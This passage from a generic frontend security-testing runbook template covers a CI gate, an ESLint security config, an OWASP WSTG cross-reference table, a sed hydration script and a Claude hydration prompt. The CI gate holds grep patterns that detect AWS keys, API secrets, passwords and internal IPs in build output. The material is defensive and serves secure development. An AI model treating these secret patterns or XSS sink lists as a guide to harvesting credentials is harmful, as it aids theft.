cognitoClientSecret: 'abc123'             // secret (clientId is OK, clientSecret is NOT)
internalServiceHost: 'internal.corp.net'  // internal DNS

// ✅ SAFE — only public, non-sensitive config
apiBaseUrl: '/api'                    // relative URL — no topology
cognitoClientId: 'abc123'             // public in PKCE flow by design
featureFlags: { darkMode: true }      // non-sensitive
```

### CI gate

```bash
# Build first
{{PROD_BUILD_CMD}}

# Check for secrets in bundle
grep -rE "(AKIA[0-9A-Z]{16}|sk-live-|password\s*[:=]\s*['\"][^'\"]{8,})" \
  dist/ && echo "FAIL: Secret in production bundle" && exit 1

# Check for internal IPs
grep -rE "10\.[0-9]+\.[0-9]+\.[0-9]+|192\.168\.[0-9]+\.[0-9]+" \
  dist/ && echo "WARN: Internal IP in bundle"

# Check source maps absent in production
{{SOURCEMAP_CHECK}} 2>/dev/null \
  && echo "FAIL: Source maps in production bundle" && exit 1
```

---

## 13 — Framework-Specific Traps

> **This section is intentionally left as a placeholder.**
> When hydrating for a specific stack, add:
>
> - `{{FE_FRAMEWORK}}`-version-specific CVEs and their fix versions
> - State management version-specific pitfalls (e.g., NgRx SignalStore vs classic Store)
> - Router version-specific `canActivate` vs `canMatch` semantic differences
> - Build tool–specific source map and bundle analysis notes
> - Known issues with `{{MARKDOWN_LIB}}` version in use
> - `{{VIZ_LIB}}` version-specific formatter behaviour changes
>
> Reference format:
>
> ```
> ### {{FE_FRAMEWORK}}-specific trap: <name>
> **CVE**: {{CVE_IF_APPLICABLE}}
> **Affected version**: {{VERSION}}
> **Fixed in**: {{FIX_VERSION}}
> **Diagnostic**: rg pattern
> **Test**: which section above covers it
> ```

---

## 14 — ESLint / Static Analysis Configuration

Adapt this config for `{{FE_FRAMEWORK}}` and add to `.eslintrc.json`:

```json
{
  "plugins": ["security"],
  "rules": {
    "security/detect-eval-with-expression": "error",
    "security/detect-non-literal-regexp": "warn",
    "security/detect-unsafe-regex": "error",
    "no-eval": "error",
    "no-new-func": "error",

    "no-restricted-properties": [
      "error",
      {
        "object": "document",
        "property": "write",
        "message": "Use framework template bindings instead of document.write"
      }
    ],

    "no-restricted-globals": [
      "warn",
      {
        "name": "localStorage",
        "message": "Do not store auth tokens in localStorage. Use memory or HttpOnly cookies."
      },
      {
        "name": "sessionStorage",
        "message": "Do not store auth tokens in sessionStorage."
      }
    ],

    "@typescript-eslint/no-explicit-any": "error",
    "@typescript-eslint/no-unsafe-assignment": "warn"
  }
}
```

---

## 15 — WSTG Checklist Cross-Reference

| WSTG ID | Test Name | Section |
|---|---|---|
| WSTG-CONF-05 | Admin Interface Enumeration | §12 (bundle) |
| WSTG-CONF-07 | HTTP Strict Transport Security | §11 |
| WSTG-CONF-12 | Content Security Policy | §11 |
| WSTG-CONF-14 | HTTP Security Header Misconfigurations | §11 |
| WSTG-ATHN-04 | Bypassing Authentication Schema | §7 (guards) |
| WSTG-ATHZ-02 | Bypassing Authorization Schema | §7, §8 |
| WSTG-SESS-01 | Session Management Schema | §4 |
| WSTG-SESS-02 | Cookie Attributes | §4 |
| WSTG-SESS-04 | Exposed Session Variables | §6 (DevTools) |
| WSTG-SESS-05 | CSRF | §5 (XSRF token leakage) |
| WSTG-INPV-01 | Reflected XSS | §1, §2, §3 |
| WSTG-INPV-02 | Stored XSS | §1, §3 |
| WSTG-BUSL-07 | Application Misuse Defences | §10 (bomb) |
| WSTG-CLNT-01 | DOM XSS | §1, §2, §3, §4 |
| WSTG-CLNT-04 | Client-Side URL Redirect | §7 |
| WSTG-CLNT-07 | CORS | §5 |
| WSTG-CLNT-09 | Clickjacking | §11 (`frame-ancestors`) |
| WSTG-CLNT-12 | Browser Storage | §4 |
| WSTG-APIT-02 | Broken Object Level Authorization | §8 (permission bypass) |

---

## 16 — Hydration Script & Claude Prompt

### Option A — Bash `sed` script

```bash
#!/usr/bin/env bash
# hydrate-frontend-runbook.sh

STACK_NAME="MyProject"
FE_FRAMEWORK="Angular 20.3.16"
FE_FILE_EXT="ts"
TEMPLATE_EXT="html"
SRC_ROOT="src/app"
SANITIZE_BYPASS_FN="bypassSecurityTrustHtml"
SANITIZE_BYPASS_PATTERN="bypassSecurityTrust(Html\\|Style\\|Script\\|Url)"
BINDING_SYNTAX="\\[innerHTML\\]"
DOM_WRITE_PATTERN="nativeElement\\.(innerHTML\\|outerHTML)"
SANITIZE_LIB="DOMPurify"
LIFECYCLE_HOOK_PATTERN="afterRender\\|afterNextRender"
STATE_LIBRARY="NgRx 20.1.0"
DEVTOOLS_MODULE="StoreDevtoolsModule"
DEVTOOLS_PROD_GUARD="isDevMode()"
DEVTOOLS_SANITIZER="stateSanitizer / actionSanitizer"
HTTP_CLIENT="HttpClient"
HTTP_INTERCEPTOR="HttpInterceptor"
ALLOWED_ORIGINS_CONFIG="ALLOWED_ORIGINS"
ROUTER="Angular Router"
NAVIGATE_FN_PATTERN="router\\.navigate\\|navigateByUrl"
RETURN_URL_PARAM="returnUrl"
PERMISSION_LIB="ngx-permissions"
PERMISSION_DIRECTIVE="\\*ngxPermissionsOnly"
PERMISSION_SERVICE="NgxPermissionsService"
MARKDOWN_LIB="marked 4.2.4"
MARKDOWN_PARSE_FN="marked\\.parse\\|marked\\s*\\("
MARKDOWN_BROKEN_SANITIZE="sanitize:\\s*true"
MARKDOWN_SANITIZE_NOTE="removed in marked 4.0"
VIZ_LIB="ECharts"
VIZ_FORMATTER_PATTERN="formatter\\s*:"
VIZ_ENCODE_FN="echarts.format.encodeHTML"
THIRD_PARTY_WIDGET="angularx-qrcode"
WIDGET_DATA_BINDING="\\[qrdata\\]"
WIDGET_DATA_MAX_LEN="2953"
COMPRESS_LIB="pako 2.1.0"
COMPRESS_INFLATE_FN="pako.inflate"
COMPRESS_MAX_BYTES="10485760"
TEST_FRAMEWORK="Karma/Jasmine"
TEST_DESCRIBE_FN="describe("
TEST_IT_FN="it("
TEST_FIXTURE="ComponentFixture"
PACKAGE_MANAGER="npm"
PROD_BUILD_CMD="ng build --configuration production"
LINT_CMD="npx eslint src/"
DEP_AUDIT_CMD="npm audit --audit-level=high"
SOURCEMAP_CHECK="ls dist/**/*.map"
FRAMEWORK_SPECIFIC_SECTION="Angular 20 specific traps"

INPUT_AGENT="security-tester-frontend-generic.md"
INPUT_RUNBOOK="security-testing-runbook-frontend-generic.md"

for FILE in "$INPUT_AGENT" "$INPUT_RUNBOOK"; do
  OUTPUT="${FILE/generic/${STACK_NAME,,}}"
  sed \
    -e "s|{{STACK_NAME}}|${STACK_NAME}|g" \
    -e "s|{{FE_FRAMEWORK}}|${FE_FRAMEWORK}|g" \
    -e "s|{{FE_FILE_EXT}}|${FE_FILE_EXT}|g" \
    -e "s|{{TEMPLATE_EXT}}|${TEMPLATE_EXT}|g" \
    -e "s|{{SRC_ROOT}}|${SRC_ROOT}|g" \
    -e "s|{{SANITIZE_BYPASS_FN}}|${SANITIZE_BYPASS_FN}|g" \
    -e "s|{{SANITIZE_BYPASS_PATTERN}}|${SANITIZE_BYPASS_PATTERN}|g" \
    -e "s|{{BINDING_SYNTAX}}|${BINDING_SYNTAX}|g" \
    -e "s|{{DOM_WRITE_PATTERN}}|${DOM_WRITE_PATTERN}|g" \
    -e "s|{{SANITIZE_LIB}}|${SANITIZE_LIB}|g" \
    -e "s|{{LIFECYCLE_HOOK_PATTERN}}|${LIFECYCLE_HOOK_PATTERN}|g" \
    -e "s|{{STATE_LIBRARY}}|${STATE_LIBRARY}|g" \
    -e "s|{{DEVTOOLS_MODULE}}|${DEVTOOLS_MODULE}|g" \
    -e "s|{{DEVTOOLS_PROD_GUARD}}|${DEVTOOLS_PROD_GUARD}|g" \
    -e "s|{{DEVTOOLS_SANITIZER}}|${DEVTOOLS_SANITIZER}|g" \
    -e "s|{{HTTP_CLIENT}}|${HTTP_CLIENT}|g" \
    -e "s|{{HTTP_INTERCEPTOR}}|${HTTP_INTERCEPTOR}|g" \
    -e "s|{{ALLOWED_ORIGINS_CONFIG}}|${ALLOWED_ORIGINS_CONFIG}|g" \
    -e "s|{{ROUTER}}|${ROUTER}|g" \
    -e "s|{{NAVIGATE_FN_PATTERN}}|${NAVIGATE_FN_PATTERN}|g" \
    -e "s|{{RETURN_URL_PARAM}}|${RETURN_URL_PARAM}|g" \
    -e "s|{{PERMISSION_LIB}}|${PERMISSION_LIB}|g" \
    -e "s|{{PERMISSION_DIRECTIVE}}|${PERMISSION_DIRECTIVE}|g" \
    -e "s|{{PERMISSION_SERVICE}}|${PERMISSION_SERVICE}|g" \
    -e "s|{{MARKDOWN_LIB}}|${MARKDOWN_LIB}|g" \
    -e "s|{{MARKDOWN_PARSE_FN}}|${MARKDOWN_PARSE_FN}|g" \
    -e "s|{{MARKDOWN_BROKEN_SANITIZE}}|${MARKDOWN_BROKEN_SANITIZE}|g" \
    -e "s|{{MARKDOWN_SANITIZE_NOTE}}|${MARKDOWN_SANITIZE_NOTE}|g" \
    -e "s|{{VIZ_LIB}}|${VIZ_LIB}|g" \
    -e "s|{{VIZ_FORMATTER_PATTERN}}|${VIZ_FORMATTER_PATTERN}|g" \
    -e "s|{{VIZ_ENCODE_FN}}|${VIZ_ENCODE_FN}|g" \
    -e "s|{{THIRD_PARTY_WIDGET}}|${THIRD_PARTY_WIDGET}|g" \
    -e "s|{{WIDGET_DATA_BINDING}}|${WIDGET_DATA_BINDING}|g" \
    -e "s|{{WIDGET_DATA_MAX_LEN}}|${WIDGET_DATA_MAX_LEN}|g" \
    -e "s|{{COMPRESS_LIB}}|${COMPRESS_LIB}|g" \
    -e "s|{{COMPRESS_INFLATE_FN}}|${COMPRESS_INFLATE_FN}|g" \
    -e "s|{{COMPRESS_MAX_BYTES}}|${COMPRESS_MAX_BYTES}|g" \
    -e "s|{{TEST_FRAMEWORK}}|${TEST_FRAMEWORK}|g" \
    -e "s|{{TEST_DESCRIBE_FN}}|${TEST_DESCRIBE_FN}|g" \
    -e "s|{{TEST_IT_FN}}|${TEST_IT_FN}|g" \
    -e "s|{{TEST_FIXTURE}}|${TEST_FIXTURE}|g" \
    -e "s|{{PACKAGE_MANAGER}}|${PACKAGE_MANAGER}|g" \
    -e "s|{{PROD_BUILD_CMD}}|${PROD_BUILD_CMD}|g" \
    -e "s|{{LINT_CMD}}|${LINT_CMD}|g" \
    -e "s|{{DEP_AUDIT_CMD}}|${DEP_AUDIT_CMD}|g" \
    -e "s|{{SOURCEMAP_CHECK}}|${SOURCEMAP_CHECK}|g" \
    -e "s|{{FRAMEWORK_SPECIFIC_SECTION}}|${FRAMEWORK_SPECIFIC_SECTION}|g" \
    "$FILE" > "$OUTPUT"
  echo "Generated: $OUTPUT"
done
```

### Option B — Claude hydration prompt

```
I need you to hydrate the frontend security testing templates for a new project.

Tech stack:
- Project name: [NAME]
- Frontend framework: [FRAMEWORK + VERSION]
- Language / file extension: [LANGUAGE e.g. TypeScript .ts]
- Template extension: [EXTENSION e.g. html, tsx]
- XSS bypass function: [FRAMEWORK_BYPASS_API]
- HTML binding syntax: [BINDING e.g. [innerHTML], v-html, dangerouslySetInnerHTML]
- State management: [LIBRARY + VERSION]
- DevTools module: [DEVTOOLS_MODULE]
- HTTP interceptor mechanism: [INTERCEPTOR_API]
- Router: [ROUTER_LIBRARY]
- Client-side permission library: [PERMISSION_LIB or "none"]
- Markdown library: [MARKDOWN_LIB + VERSION]
  - Known sanitizer issue (if any): [DESCRIPTION or "none"]
- Visualisation library: [VIZ_LIB]
  - HTML encode function: [ENCODE_FN]
- Third-party widget library: [WIDGET_LIB or "none"]
- Compression library: [COMPRESS_LIB or "none"]
- Test framework: [TEST_FRAMEWORK]
- Package manager: [npm/pnpm/yarn]
- Build command: [PROD_BUILD_CMD]

Instructions:
1. Replace every {{PLACEHOLDER}} in the attached generic agent and runbook
   with the concrete value for this stack.
2. For {{PERMISSION_LIB}} = "none": remove §8 entirely.
3. For {{THIRD_PARTY_WIDGET}} = "none": remove §9 entirely.
4. For {{COMPRESS_LIB}} = "none": remove §10 entirely.
5. In §13, add 3-5 framework-version-specific traps for [FRAMEWORK + VERSION].
   Include any CVEs affecting the exact version. Include lifecycle hook security
   changes and router guard semantic changes specific to this version.
6. In all grep patterns, adapt regexes to match [LANGUAGE] and [TEMPLATE EXTENSION].
7. In all test templates, rewrite pseudocode to [TEST_FRAMEWORK] syntax.
8. Output two complete files: security-tester-[name]-frontend.md and
   security-testing-runbook-[name]-frontend.md
```
